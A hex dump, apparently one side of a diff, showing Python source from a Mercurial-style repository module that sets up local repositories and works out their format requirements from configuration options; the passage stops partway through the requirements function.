-00020190: 2031 2929 0a0a 0a64 6566 2069 6e73 7461   1))...def insta
-000201a0: 6e63 6528 7569 2c20 7061 7468 3a20 6279  nce(ui, path: by
-000201b0: 7465 732c 2063 7265 6174 652c 2069 6e74  tes, create, int
-000201c0: 656e 7473 3d4e 6f6e 652c 2063 7265 6174  ents=None, creat
-000201d0: 656f 7074 733d 4e6f 6e65 293a 0a20 2020  eopts=None):.   
-000201e0: 2023 2070 7265 7665 6e74 2063 7963 6c69   # prevent cycli
-000201f0: 6320 696d 706f 7274 206c 6f63 616c 7265  c import localre
-00020200: 706f 202d 3e20 7570 6772 6164 6520 2d3e  po -> upgrade ->
-00020210: 206c 6f63 616c 7265 706f 0a20 2020 2066   localrepo.    f
-00020220: 726f 6d20 2e20 696d 706f 7274 2075 7067  rom . import upg
-00020230: 7261 6465 0a0a 2020 2020 6c6f 6361 6c70  rade..    localp
-00020240: 6174 6820 3d20 7572 6c75 7469 6c2e 7572  ath = urlutil.ur
-00020250: 6c6c 6f63 616c 7061 7468 2870 6174 6829  llocalpath(path)
-00020260: 0a20 2020 2069 6620 6372 6561 7465 3a0a  .    if create:.
-00020270: 2020 2020 2020 2020 6372 6561 7465 7265          createre
-00020280: 706f 7369 746f 7279 2875 692c 206c 6f63  pository(ui, loc
-00020290: 616c 7061 7468 2c20 6372 6561 7465 6f70  alpath, createop
-000202a0: 7473 3d63 7265 6174 656f 7074 7329 0a0a  ts=createopts)..
-000202b0: 2020 2020 6465 6620 7265 706f 5f6d 616b      def repo_mak
-000202c0: 6572 2829 3a0a 2020 2020 2020 2020 7265  er():.        re
-000202d0: 7475 726e 206d 616b 656c 6f63 616c 7265  turn makelocalre
-000202e0: 706f 7369 746f 7279 2875 692c 206c 6f63  pository(ui, loc
-000202f0: 616c 7061 7468 2c20 696e 7465 6e74 733d  alpath, intents=
-00020300: 696e 7465 6e74 7329 0a0a 2020 2020 7265  intents)..    re
-00020310: 706f 203d 2072 6570 6f5f 6d61 6b65 7228  po = repo_maker(
-00020320: 290a 2020 2020 7265 706f 203d 2075 7067  ).    repo = upg
-00020330: 7261 6465 2e6d 6179 5f61 7574 6f5f 7570  rade.may_auto_up
-00020340: 6772 6164 6528 7265 706f 2c20 7265 706f  grade(repo, repo
-00020350: 5f6d 616b 6572 290a 2020 2020 7265 7475  _maker).    retu
-00020360: 726e 2072 6570 6f0a 0a0a 6465 6620 6973  rn repo...def is
-00020370: 6c6f 6361 6c28 7061 7468 3a20 6279 7465  local(path: byte
-00020380: 7329 202d 3e20 626f 6f6c 3a0a 2020 2020  s) -> bool:.    
-00020390: 7265 7475 726e 2054 7275 650a 0a0a 6465  return True...de
-000203a0: 6620 6465 6661 756c 7463 7265 6174 656f  f defaultcreateo
-000203b0: 7074 7328 7569 2c20 6372 6561 7465 6f70  pts(ui, createop
-000203c0: 7473 3d4e 6f6e 6529 3a0a 2020 2020 2222  ts=None):.    ""
-000203d0: 2250 6f70 756c 6174 6520 7468 6520 6465  "Populate the de
-000203e0: 6661 756c 7420 6372 6561 7469 6f6e 206f  fault creation o
-000203f0: 7074 696f 6e73 2066 6f72 2061 2072 6570  ptions for a rep
-00020400: 6f73 6974 6f72 792e 0a0a 2020 2020 4120  ository...    A 
-00020410: 6469 6374 696f 6e61 7279 206f 6620 6578  dictionary of ex
-00020420: 706c 6963 6974 6c79 2072 6571 7565 7374  plicitly request
-00020430: 6564 2063 7265 6174 696f 6e20 6f70 7469  ed creation opti
-00020440: 6f6e 7320 6361 6e20 6265 2070 6173 7365  ons can be passe
-00020450: 640a 2020 2020 696e 2e20 4d69 7373 696e  d.    in. Missin
-00020460: 6720 6b65 7973 2077 696c 6c20 6265 2070  g keys will be p
-00020470: 6f70 756c 6174 6564 2e0a 2020 2020 2222  opulated..    ""
-00020480: 220a 2020 2020 6372 6561 7465 6f70 7473  ".    createopts
-00020490: 203d 2064 6963 7428 6372 6561 7465 6f70   = dict(createop
-000204a0: 7473 206f 7220 7b7d 290a 0a20 2020 2069  ts or {})..    i
-000204b0: 6620 6227 6261 636b 656e 6427 206e 6f74  f b'backend' not
-000204c0: 2069 6e20 6372 6561 7465 6f70 7473 3a0a   in createopts:.
-000204d0: 2020 2020 2020 2020 2320 6578 7065 7269          # experi
-000204e0: 6d65 6e74 616c 2063 6f6e 6669 673a 2073  mental config: s
-000204f0: 746f 7261 6765 2e6e 6577 2d72 6570 6f2d  torage.new-repo-
-00020500: 6261 636b 656e 640a 2020 2020 2020 2020  backend.        
-00020510: 6372 6561 7465 6f70 7473 5b62 2762 6163  createopts[b'bac
-00020520: 6b65 6e64 275d 203d 2075 692e 636f 6e66  kend'] = ui.conf
-00020530: 6967 2862 2773 746f 7261 6765 272c 2062  ig(b'storage', b
-00020540: 276e 6577 2d72 6570 6f2d 6261 636b 656e  'new-repo-backen
-00020550: 6427 290a 0a20 2020 2072 6574 7572 6e20  d')..    return 
-00020560: 6372 6561 7465 6f70 7473 0a0a 0a64 6566  createopts...def
-00020570: 2063 6c6f 6e65 5f72 6571 7569 7265 6d65   clone_requireme
-00020580: 6e74 7328 7569 2c20 6372 6561 7465 6f70  nts(ui, createop
-00020590: 7473 2c20 7372 6372 6570 6f29 3a0a 2020  ts, srcrepo):.  
-000205a0: 2020 2222 2263 6c6f 6e65 2074 6865 2072    """clone the r
-000205b0: 6571 7569 7265 6d65 6e74 7320 6f66 2061  equirements of a
-000205c0: 206c 6f63 616c 2072 6570 6f20 666f 7220   local repo for 
-000205d0: 6120 6c6f 6361 6c20 636c 6f6e 650a 0a20  a local clone.. 
-000205e0: 2020 2054 6865 2073 746f 7265 2072 6571     The store req
-000205f0: 7569 7265 6d65 6e74 7320 6172 6520 756e  uirements are un
-00020600: 6368 616e 6765 6420 7768 696c 6520 7468  changed while th
-00020610: 6520 776f 726b 696e 6720 636f 7079 2072  e working copy r
-00020620: 6571 7569 7265 6d65 6e74 730a 2020 2020  equirements.    
-00020630: 6465 7065 6e64 7320 6f6e 2074 6865 2063  depends on the c
-00020640: 6f6e 6669 6775 7261 7469 6f6e 0a20 2020  onfiguration.   
-00020650: 2022 2222 0a20 2020 2074 6172 6765 745f   """.    target_
-00020660: 7265 7175 6972 656d 656e 7473 203d 2073  requirements = s
-00020670: 6574 2829 0a20 2020 2069 6620 6e6f 7420  et().    if not 
-00020680: 7372 6372 6570 6f2e 7265 7175 6972 656d  srcrepo.requirem
-00020690: 656e 7473 3a0a 2020 2020 2020 2020 2320  ents:.        # 
-000206a0: 7468 6973 2069 7320 6120 6c65 6761 6379  this is a legacy
-000206b0: 2072 6576 6c6f 6720 2276 3022 2072 6570   revlog "v0" rep
-000206c0: 6f73 6974 6f72 792c 2077 6520 6361 6e6e  ository, we cann
-000206d0: 6f74 2064 6f20 616e 7974 6869 6e67 2066  ot do anything f
-000206e0: 616e 6379 0a20 2020 2020 2020 2023 2077  ancy.        # w
-000206f0: 6974 6820 6974 2e0a 2020 2020 2020 2020  ith it..        
-00020700: 7265 7475 726e 2074 6172 6765 745f 7265  return target_re
-00020710: 7175 6972 656d 656e 7473 0a20 2020 2063  quirements.    c
-00020720: 7265 6174 656f 7074 7320 3d20 6465 6661  reateopts = defa
-00020730: 756c 7463 7265 6174 656f 7074 7328 7569  ultcreateopts(ui
-00020740: 2c20 6372 6561 7465 6f70 7473 3d63 7265  , createopts=cre
-00020750: 6174 656f 7074 7329 0a20 2020 2066 6f72  ateopts).    for
-00020760: 2072 2069 6e20 6e65 7772 6570 6f72 6571   r in newreporeq
-00020770: 7569 7265 6d65 6e74 7328 7569 2c20 6372  uirements(ui, cr
-00020780: 6561 7465 6f70 7473 293a 0a20 2020 2020  eateopts):.     
-00020790: 2020 2069 6620 7220 696e 2072 6571 7569     if r in requi
-000207a0: 7265 6d65 6e74 736d 6f64 2e57 4f52 4b49  rementsmod.WORKI
-000207b0: 4e47 5f44 4952 5f52 4551 5549 5245 4d45  NG_DIR_REQUIREME
-000207c0: 4e54 533a 0a20 2020 2020 2020 2020 2020  NTS:.           
-000207d0: 2074 6172 6765 745f 7265 7175 6972 656d   target_requirem
-000207e0: 656e 7473 2e61 6464 2872 290a 0a20 2020  ents.add(r)..   
-000207f0: 2066 6f72 2072 2069 6e20 7372 6372 6570   for r in srcrep
-00020800: 6f2e 7265 7175 6972 656d 656e 7473 3a0a  o.requirements:.
-00020810: 2020 2020 2020 2020 6966 2072 206e 6f74          if r not
-00020820: 2069 6e20 7265 7175 6972 656d 656e 7473   in requirements
-00020830: 6d6f 642e 574f 524b 494e 475f 4449 525f  mod.WORKING_DIR_
-00020840: 5245 5155 4952 454d 454e 5453 3a0a 2020  REQUIREMENTS:.  
-00020850: 2020 2020 2020 2020 2020 7461 7267 6574            target
-00020860: 5f72 6571 7569 7265 6d65 6e74 732e 6164  _requirements.ad
-00020870: 6428 7229 0a20 2020 2072 6574 7572 6e20  d(r).    return 
-00020880: 7461 7267 6574 5f72 6571 7569 7265 6d65  target_requireme
-00020890: 6e74 730a 0a0a 6465 6620 6e65 7772 6570  nts...def newrep
-000208a0: 6f72 6571 7569 7265 6d65 6e74 7328 7569  orequirements(ui
-000208b0: 2c20 6372 6561 7465 6f70 7473 293a 0a20  , createopts):. 
-000208c0: 2020 2022 2222 4465 7465 726d 696e 6520     """Determine 
-000208d0: 7468 6520 7365 7420 6f66 2072 6571 7569  the set of requi
-000208e0: 7265 6d65 6e74 7320 666f 7220 6120 6e65  rements for a ne
-000208f0: 7720 6c6f 6361 6c20 7265 706f 7369 746f  w local reposito
-00020900: 7279 2e0a 0a20 2020 2045 7874 656e 7369  ry...    Extensi
-00020910: 6f6e 7320 6361 6e20 7772 6170 2074 6869  ons can wrap thi
-00020920: 7320 6675 6e63 7469 6f6e 2074 6f20 7370  s function to sp
-00020930: 6563 6966 7920 6375 7374 6f6d 2072 6571  ecify custom req
-00020940: 7569 7265 6d65 6e74 7320 666f 720a 2020  uirements for.  
-00020950: 2020 6e65 7720 7265 706f 7369 746f 7269    new repositori
-00020960: 6573 2e0a 2020 2020 2222 220a 0a20 2020  es..    """..   
-00020970: 2069 6620 6227 6261 636b 656e 6427 206e   if b'backend' n
-00020980: 6f74 2069 6e20 6372 6561 7465 6f70 7473  ot in createopts
-00020990: 3a0a 2020 2020 2020 2020 7261 6973 6520  :.        raise 
-000209a0: 6572 726f 722e 5072 6f67 7261 6d6d 696e  error.Programmin
-000209b0: 6745 7272 6f72 280a 2020 2020 2020 2020  gError(.        
-000209c0: 2020 2020 6227 6261 636b 656e 6420 6b65      b'backend ke
-000209d0: 7920 6e6f 7420 7072 6573 656e 7420 696e  y not present in
-000209e0: 2063 7265 6174 656f 7074 733b 2027 0a20   createopts; '. 
-000209f0: 2020 2020 2020 2020 2020 2062 2777 6173             b'was
-00020a00: 2064 6566 6175 6c74 6372 6561 7465 6f70   defaultcreateop
-00020a10: 7473 2829 2063 616c 6c65 643f 270a 2020  ts() called?'.  
-00020a20: 2020 2020 2020 290a 0a20 2020 2069 6620        )..    if 
-00020a30: 6372 6561 7465 6f70 7473 5b62 2762 6163  createopts[b'bac
-00020a40: 6b65 6e64 275d 2021 3d20 6227 7265 766c  kend'] != b'revl
-00020a50: 6f67 7631 273a 0a20 2020 2020 2020 2072  ogv1':.        r
-00020a60: 6169 7365 2065 7272 6f72 2e41 626f 7274  aise error.Abort
-00020a70: 280a 2020 2020 2020 2020 2020 2020 5f28  (.            _(
-00020a80: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00020a90: 2062 2775 6e61 626c 6520 746f 2064 6574   b'unable to det
-00020aa0: 6572 6d69 6e65 2072 6570 6f73 6974 6f72  ermine repositor
-00020ab0: 7920 7265 7175 6972 656d 656e 7473 2066  y requirements f
-00020ac0: 6f72 2027 0a20 2020 2020 2020 2020 2020  or '.           
-00020ad0: 2020 2020 2062 2773 746f 7261 6765 2062       b'storage b
-00020ae0: 6163 6b65 6e64 3a20 2573 270a 2020 2020  ackend: %s'.    
-00020af0: 2020 2020 2020 2020 290a 2020 2020 2020          ).      
-00020b00: 2020 2020 2020 2520 6372 6561 7465 6f70        % createop
-00020b10: 7473 5b62 2762 6163 6b65 6e64 275d 0a20  ts[b'backend']. 
-00020b20: 2020 2020 2020 2029 0a0a 2020 2020 7265         )..    re
-00020b30: 7175 6972 656d 656e 7473 203d 207b 7265  quirements = {re
-00020b40: 7175 6972 656d 656e 7473 6d6f 642e 5245  quirementsmod.RE
-00020b50: 564c 4f47 5631 5f52 4551 5549 5245 4d45  VLOGV1_REQUIREME
-00020b60: 4e54 7d0a 2020 2020 6966 2075 692e 636f  NT}.    if ui.co
-00020b70: 6e66 6967 626f 6f6c 2862 2766 6f72 6d61  nfigbool(b'forma
-00020b80: 7427 2c20 6227 7573 6573 746f 7265 2729  t', b'usestore')
-00020b90: 3a0a 2020 2020 2020 2020 7265 7175 6972  :.        requir
-00020ba0: 656d 656e 7473 2e61 6464 2872 6571 7569  ements.add(requi
-00020bb0: 7265 6d65 6e74 736d 6f64 2e53 544f 5245  rementsmod.STORE
-00020bc0: 5f52 4551 5549 5245 4d45 4e54 290a 2020  _REQUIREMENT).  
-00020bd0: 2020 2020 2020 6966 2075 692e 636f 6e66        if ui.conf
-00020be0: 6967 626f 6f6c 2862 2766 6f72 6d61 7427  igbool(b'format'
-00020bf0: 2c20 6227 7573 6566 6e63 6163 6865 2729  , b'usefncache')
-00020c00: 3a0a 2020 2020 2020 2020 2020 2020 7265  :.            re
-00020c10: 7175 6972 656d 656e 7473 2e61 6464 2872  quirements.add(r
-00020c20: 6571 7569 7265 6d65 6e74 736d 6f64 2e46  equirementsmod.F
-00020c30: 4e43 4143 4845 5f52 4551 5549 5245 4d45  NCACHE_REQUIREME
-00020c40: 4e54 290a 2020 2020 2020 2020 2020 2020  NT).            
-00020c50: 6966 2075 692e 636f 6e66 6967 626f 6f6c  if ui.configbool
-00020c60: 2862 2766 6f72 6d61 7427 2c20 6227 646f  (b'format', b'do
-00020c70: 7465 6e63 6f64 6527 293a 0a20 2020 2020  tencode'):.     
-00020c80: 2020 2020 2020 2020 2020 2072 6571 7569             requi
-00020c90: 7265 6d65 6e74 732e 6164 6428 7265 7175  rements.add(requ
-00020ca0: 6972 656d 656e 7473 6d6f 642e 444f 5445  irementsmod.DOTE
-00020cb0: 4e43 4f44 455f 5245 5155 4952 454d 454e  NCODE_REQUIREMEN
-00020cc0: 5429 0a0a 2020 2020 636f 6d70 656e 6769  T)..    compengi
-00020cd0: 6e65 7320 3d20 7569 2e63 6f6e 6669 676c  nes = ui.configl
-00020ce0: 6973 7428 6227 666f 726d 6174 272c 2062  ist(b'format', b
-00020cf0: 2772 6576 6c6f 672d 636f 6d70 7265 7373  'revlog-compress
-00020d00: 696f 6e27 290a 2020 2020 666f 7220 636f  ion').    for co
-00020d10: 6d70 656e 6769 6e65 2069 6e20 636f 6d70  mpengine in comp
-00020d20: 656e 6769 6e65 733a 0a20 2020 2020 2020  engines:.       
-00020d30: 2069 6620 636f 6d70 656e 6769 6e65 2069   if compengine i
-00020d40: 6e20 7574 696c 2e63 6f6d 7065 6e67 696e  n util.compengin
-00020d50: 6573 3a0a 2020 2020 2020 2020 2020 2020  es:.            
-00020d60: 656e 6769 6e65 203d 2075 7469 6c2e 636f  engine = util.co
-00020d70: 6d70 656e 6769 6e65 735b 636f 6d70 656e  mpengines[compen
-00020d80: 6769 6e65 5d0a 2020 2020 2020 2020 2020  gine].          
-00020d90: 2020 6966 2065 6e67 696e 652e 6176 6169    if engine.avai
-00020da0: 6c61 626c 6528 2920 616e 6420 656e 6769  lable() and engi
-00020db0: 6e65 2e72 6576 6c6f 6768 6561 6465 7228  ne.revlogheader(
-00020dc0: 293a 0a20 2020 2020 2020 2020 2020 2020  ):.             
-00020dd0: 2020 2062 7265 616b 0a20 2020 2065 6c73     break.    els
-00020de0: 653a 0a20 2020 2020 2020 2072 6169 7365  e:.        raise
-00020df0: 2065 7272 6f72 2e41 626f 7274 280a 2020   error.Abort(.  
-00020e00: 2020 2020 2020 2020 2020 5f28 0a20 2020            _(.   
-00020e10: 2020 2020 2020 2020 2020 2020 2062 2763               b'c
-00020e20: 6f6d 7072 6573 7369 6f6e 2065 6e67 696e  ompression engin
-00020e30: 6573 2025 7320 6465 6669 6e65 6420 6279  es %s defined by
-00020e40: 2027 0a20 2020 2020 2020 2020 2020 2020   '.             
-00020e50: 2020 2062 2766 6f72 6d61 742e 7265 766c     b'format.revl
-00020e60: 6f67 2d63 6f6d 7072 6573 7369 6f6e 206e  og-compression n
-00020e70: 6f74 2061 7661 696c 6162 6c65 270a 2020  ot available'.  
-00020e80: 2020 2020 2020 2020 2020 290a 2020 2020            ).    
-00020e90: 2020 2020 2020 2020 2520 6227 2c20 272e          % b', '.
-00020ea0: 6a6f 696e 2862 2722 2573 2227 2025 2065  join(b'"%s"' % e
-00020eb0: 2066 6f72 2065 2069 6e20 636f 6d70 656e   for e in compen
-00020ec0: 6769 6e65 7329 2c0a 2020 2020 2020 2020  gines),.        
-00020ed0: 2020 2020 6869 6e74 3d5f 280a 2020 2020      hint=_(.    
-00020ee0: 2020 2020 2020 2020 2020 2020 6227 7275              b'ru
-00020ef0: 6e20 2268 6720 6465 6275 6769 6e73 7461  n "hg debuginsta
-00020f00: 6c6c 2220 746f 206c 6973 7420 6176 6169  ll" to list avai
-00020f10: 6c61 626c 6520 270a 2020 2020 2020 2020  lable '.        
-00020f20: 2020 2020 2020 2020 6227 636f 6d70 7265          b'compre
-00020f30: 7373 696f 6e20 656e 6769 6e65 7327 0a20  ssion engines'. 
-00020f40: 2020 2020 2020 2020 2020 2029 2c0a 2020             ),.  
-00020f50: 2020 2020 2020 290a 0a20 2020 2023 207a        )..    # z
-00020f60: 6c69 6220 6973 2074 6865 2068 6973 746f  lib is the histo
-00020f70: 7269 6361 6c20 6465 6661 756c 7420 616e  rical default an
-00020f80: 6420 646f 6573 6e27 7420 6e65 6564 2061  d doesn't need a
-00020f90: 6e20 6578 706c 6963 6974 2072 6571 7569  n explicit requi
-00020fa0: 7265 6d65 6e74 2e0a 2020 2020 6966 2063  rement..    if c
-00020fb0: 6f6d 7065 6e67 696e 6520 3d3d 2062 277a  ompengine == b'z
-00020fc0: 7374 6427 3a0a 2020 2020 2020 2020 7265  std':.        re
-00020fd0: 7175 6972 656d 656e 7473 2e61 6464 2862  quirements.add(b
-00020fe0: 2772 6576 6c6f 672d 636f 6d70 7265 7373  'revlog-compress
-00020ff0: 696f 6e2d 7a73 7464 2729 0a20 2020 2065  ion-zstd').    e
-00021000: 6c69 6620 636f 6d70 656e 6769 6e65 2021  lif compengine !
-00021010: 3d20 6227 7a6c 6962 273a 0a20 2020 2020  = b'zlib':.     
-00021020: 2020 2072 6571 7569 7265 6d65 6e74 732e     requirements.
-00021030: 6164 6428 6227 6578 702d 636f 6d70 7265  add(b'exp-compre
-00021040: 7373 696f 6e2d 2573 2720 2520 636f 6d70  ssion-%s' % comp
-00021050: 656e 6769 6e65 290a 0a20 2020 2069 6620  engine)..    if 
-00021060: 7363 6d75 7469 6c2e 6764 696e 6974 636f  scmutil.gdinitco
-00021070: 6e66 6967 2875 6929 3a0a 2020 2020 2020  nfig(ui):.      
-00021080: 2020 7265 7175 6972 656d 656e 7473 2e61    requirements.a
-00021090: 6464 2872 6571 7569 7265 6d65 6e74 736d  dd(requirementsm
-000210a0: 6f64 2e47 454e 4552 414c 4445 4c54 415f  od.GENERALDELTA_
-000210b0: 5245 5155 4952 454d 454e 5429 0a20 2020  REQUIREMENT).   
-000210c0: 2020 2020 2069 6620 7569 2e63 6f6e 6669       if ui.confi
-000210d0: 6762 6f6f 6c28 6227 666f 726d 6174 272c  gbool(b'format',
-000210e0: 2062 2773 7061 7273 652d 7265 766c 6f67   b'sparse-revlog
-000210f0: 2729 3a0a 2020 2020 2020 2020 2020 2020  '):.            
-00021100: 7265 7175 6972 656d 656e 7473 2e61 6464  requirements.add
-00021110: 2872 6571 7569 7265 6d65 6e74 736d 6f64  (requirementsmod
-00021120: 2e53 5041 5253 4552 4556 4c4f 475f 5245  .SPARSEREVLOG_RE
-00021130: 5155 4952 454d 454e 5429 0a0a 2020 2020  QUIREMENT)..    
-00021140: 2320 6578 7065 7269 6d65 6e74 616c 2063  # experimental c
-00021150: 6f6e 6669 673a 2066 6f72 6d61 742e 7573  onfig: format.us
-00021160: 652d 6469 7273 7461 7465 2d76 320a 2020  e-dirstate-v2.  
-00021170: 2020 2320 4b65 6570 2074 6869 7320 6c6f    # Keep this lo
-00021180: 6769 6320 696e 2073 796e 6320 7769 7468  gic in sync with
-00021190: 2060 6861 735f 6469 7273 7461 7465 5f76   `has_dirstate_v
-000211a0: 3228 2960 2069 6e20 6074 6573 7473 2f68  2()` in `tests/h
-000211b0: 6768 6176 652e 7079 600a 2020 2020 6966  ghave.py`.    if
-000211c0: 2075 692e 636f 6e66 6967 626f 6f6c 2862   ui.configbool(b
-000211d0: 2766 6f72 6d61 7427 2c20 6227 7573 652d  'format', b'use-
-000211e0: 6469 7273 7461 7465 2d76 3227 293a 0a20  dirstate-v2'):. 
-000211f0: 2020 2020 2020 2072 6571 7569 7265 6d65         requireme
-00021200: 6e74 732e 6164 6428 7265 7175 6972 656d  nts.add(requirem
-00021210: 656e 7473 6d6f 642e 4449 5253 5441 5445  entsmod.DIRSTATE
-00021220: 5f56 325f 5245 5155 4952 454d 454e 5429  _V2_REQUIREMENT)
-00021230: 0a0a 2020 2020 2320 6578 7065 7269 6d65  ..    # experime
-00021240: 6e74 616c 2063 6f6e 6669 673a 2066 6f72  ntal config: for
-00021250: 6d61 742e 6578 702d 7573 652d 636f 7069  mat.exp-use-copi
-00021260: 6573 2d73 6964 652d 6461 7461 2d63 6861  es-side-data-cha
-00021270: 6e67 6573 6574 0a20 2020 2069 6620 7569  ngeset.    if ui
-00021280: 2e63 6f6e 6669 6762 6f6f 6c28 6227 666f  .configbool(b'fo
-00021290: 726d 6174 272c 2062 2765 7870 2d75 7365  rmat', b'exp-use
-000212a0: 2d63 6f70 6965 732d 7369 6465 2d64 6174  -copies-side-dat
-000212b0: 612d 6368 616e 6765 7365 7427 293a 0a20  a-changeset'):. 
-000212c0: 2020 2020 2020 2072 6571 7569 7265 6d65         requireme
-000212d0: 6e74 732e 6164 6428 7265 7175 6972 656d  nts.add(requirem
-000212e0: 656e 7473 6d6f 642e 4348 414e 4745 4c4f  entsmod.CHANGELO
-000212f0: 4756 325f 5245 5155 4952 454d 454e 5429  GV2_REQUIREMENT)
-00021300: 0a20 2020 2020 2020 2072 6571 7569 7265  .        require
-00021310: 6d65 6e74 732e 6164 6428 7265 7175 6972  ments.add(requir
-00021320: 656d 656e 7473 6d6f 642e 434f 5049 4553  ementsmod.COPIES
-00021330: 5344 435f 5245 5155 4952 454d 454e 5429  SDC_REQUIREMENT)
-00021340: 0a20 2020 2069 6620 7569 2e63 6f6e 6669  .    if ui.confi
-00021350: 6762 6f6f 6c28 6227 6578 7065 7269 6d65  gbool(b'experime
-00021360: 6e74 616c 272c 2062 2774 7265 656d 616e  ntal', b'treeman
-00021370: 6966 6573 7427 293a 0a20 2020 2020 2020  ifest'):.       
-00021380: 2072 6571 7569 7265 6d65 6e74 732e 6164   requirements.ad
-00021390: 6428 7265 7175 6972 656d 656e 7473 6d6f  d(requirementsmo
-000213a0: 642e 5452 4545 4d41 4e49 4645 5354 5f52  d.TREEMANIFEST_R
-000213b0: 4551 5549 5245 4d45 4e54 290a 0a20 2020  EQUIREMENT)..   
-000213c0: 2063 6861 6e67 656c 6f67 7632 203d 2075   changelogv2 = u
-000213d0: 692e 636f 6e66 6967 2862 2766 6f72 6d61  i.config(b'forma
-000213e0: 7427 2c20 6227 6578 702d 7573 652d 6368  t', b'exp-use-ch
-000213f0: 616e 6765 6c6f 672d 7632 2729 0a20 2020  angelog-v2').   
-00021400: 2069 6620 6368 616e 6765 6c6f 6776 3220   if changelogv2 
-00021410: 3d3d 2062 2765 6e61 626c 652d 756e 7374  == b'enable-unst
-00021420: 6162 6c65 2d66 6f72 6d61 742d 616e 642d  able-format-and-
-00021430: 636f 7272 7570 742d 6d79 2d64 6174 6127  corrupt-my-data'
-00021440: 3a0a 2020 2020 2020 2020 7265 7175 6972  :.        requir
-00021450: 656d 656e 7473 2e61 6464 2872 6571 7569  ements.add(requi
-00021460: 7265 6d65 6e74 736d 6f64 2e43 4841 4e47  rementsmod.CHANG
-00021470: 454c 4f47 5632 5f52 4551 5549 5245 4d45  ELOGV2_REQUIREME
-00021480: 4e54 290a 0a20 2020 2072 6576 6c6f 6776  NT)..    revlogv
-00021490: 3220 3d20 7569 2e63 6f6e 6669 6728 6227  2 = ui.config(b'
-000214a0: 6578 7065 7269 6d65 6e74 616c 272c 2062  experimental', b
-000214b0: 2772 6576 6c6f 6776 3227 290a 2020 2020  'revlogv2').    
-000214c0: 6966 2072 6576 6c6f 6776 3220 3d3d 2062  if revlogv2 == b
-000214d0: 2765 6e61 626c 652d 756e 7374 6162 6c65  'enable-unstable
-000214e0: 2d66 6f72 6d61 742d 616e 642d 636f 7272  -format-and-corr
-000214f0: 7570 742d 6d79 2d64 6174 6127 3a0a 2020  upt-my-data':.  
-00021500: 2020 2020 2020 7265 7175 6972 656d 656e        requiremen
-00021510: 7473 2e64 6973 6361 7264 2872 6571 7569  ts.discard(requi
-00021520: 7265 6d65 6e74 736d 6f64 2e52 4556 4c4f  rementsmod.REVLO
-00021530: 4756 315f 5245 5155 4952 454d 454e 5429  GV1_REQUIREMENT)
-00021540: 0a20 2020 2020 2020 2072 6571 7569 7265  .        require
-00021550: 6d65 6e74 732e 6164 6428 7265 7175 6972  ments.add(requir
-00021560: 656d 656e 7473 6d6f 642e 5245 564c 4f47  ementsmod.REVLOG
-00021570: 5632 5f52 4551 5549 5245 4d45 4e54 290a  V2_REQUIREMENT).
-00021580: 2020 2020 2320 6578 7065 7269 6d65 6e74      # experiment
-00021590: 616c 2063 6f6e 6669 673a 2066 6f72 6d61  al config: forma
-000215a0: 742e 696e 7465 726e 616c 2d70 6861 7365  t.internal-phase
-000215b0: 0a20 2020 2069 6620 7569 2e63 6f6e 6669  .    if ui.confi
-000215c0: 6762 6f6f 6c28 6227 666f 726d 6174 272c  gbool(b'format',
-000215d0: 2062 2775 7365 2d69 6e74 6572 6e61 6c2d   b'use-internal-
-000215e0: 7068 6173 6527 293a 0a20 2020 2020 2020  phase'):.       
-000215f0: 2072 6571 7569 7265 6d65 6e74 732e 6164   requirements.ad
-00021600: 6428 7265 7175 6972 656d 656e 7473 6d6f  d(requirementsmo
-00021610: 642e 494e 5445 524e 414c 5f50 4841 5345  d.INTERNAL_PHASE
-00021620: 5f52 4551 5549 5245 4d45 4e54 290a 0a20  _REQUIREMENT).. 
-00021630: 2020 2023 2065 7870 6572 696d 656e 7461     # experimenta
-00021640: 6c20 636f 6e66 6967 3a20 666f 726d 6174  l config: format
-00021650: 2e65 7870 2d61 7263 6869 7665 642d 7068  .exp-archived-ph
-00021660: 6173 650a 2020 2020 6966 2075 692e 636f  ase.    if ui.co
-00021670: 6e66 6967 626f 6f6c 2862 2766 6f72 6d61  nfigbool(b'forma
-00021680: 7427 2c20 6227 6578 702d 6172 6368 6976  t', b'exp-archiv
-00021690: 6564 2d70 6861 7365 2729 3a0a 2020 2020  ed-phase'):.    
-000216a0: 2020 2020 7265 7175 6972 656d 656e 7473      requirements
-000216b0: 2e61 6464 2872 6571 7569 7265 6d65 6e74  .add(requirement
-000216c0: 736d 6f64 2e41 5243 4849 5645 445f 5048  smod.ARCHIVED_PH
-000216d0: 4153 455f 5245 5155 4952 454d 454e 5429  ASE_REQUIREMENT)
-000216e0: 0a0a 2020 2020 6966 2063 7265 6174 656f  ..    if createo
-000216f0: 7074 732e 6765 7428 6227 6e61 7272 6f77  pts.get(b'narrow
-00021700: 6669 6c65 7327 293a 0a20 2020 2020 2020  files'):.       
-00021710: 2072 6571 7569 7265 6d65 6e74 732e 6164   requirements.ad
-00021720: 6428 7265 7175 6972 656d 656e 7473 6d6f  d(requirementsmo
-00021730: 642e 4e41 5252 4f57 5f52 4551 5549 5245  d.NARROW_REQUIRE
-00021740: 4d45 4e54 290a 0a20 2020 2069 6620 6372  MENT)..    if cr
-00021750: 6561 7465 6f70 7473 2e67 6574 2862 276c  eateopts.get(b'l
-00021760: 6673 2729 3a0a 2020 2020 2020 2020 7265  fs'):.        re
-00021770: 7175 6972 656d 656e 7473 2e61 6464 2862  quirements.add(b
-00021780: 276c 6673 2729 0a0a 2020 2020 6966 2075  'lfs')..    if u
-00021790: 692e 636f 6e66 6967 626f 6f6c 2862 2766  i.configbool(b'f
-000217a0: 6f72 6d61 7427 2c20 6227 626f 6f6b 6d61  ormat', b'bookma
-000217b0: 726b 732d 696e 2d73 746f 7265 2729 3a0a  rks-in-store'):.
-000217c0: 2020 2020 2020 2020 7265 7175 6972 656d          requirem
-000217d0: 656e 7473 2e61 6464 2872 6571 7569 7265  ents.add(require
-000217e0: 6d65 6e74 736d 6f64 2e42 4f4f 4b4d 4152  mentsmod.BOOKMAR
-000217f0: 4b53 5f49 4e5f 5354 4f52 455f 5245 5155  KS_IN_STORE_REQU
-00021800: 4952 454d 454e 5429 0a0a 2020 2020 6966  IREMENT)..    if
-00021810: 2075 692e 636f 6e66 6967 626f 6f6c 2862   ui.configbool(b
-00021820: 2766 6f72 6d61 7427 2c20 6227 7573 652d  'format', b'use-
-00021830: 7065 7273 6973 7465 6e74 2d6e 6f64 656d  persistent-nodem
-00021840: 6170 2729 3a0a 2020 2020 2020 2020 7265  ap'):.        re
-00021850: 7175 6972 656d 656e 7473 2e61 6464 2872  quirements.add(r
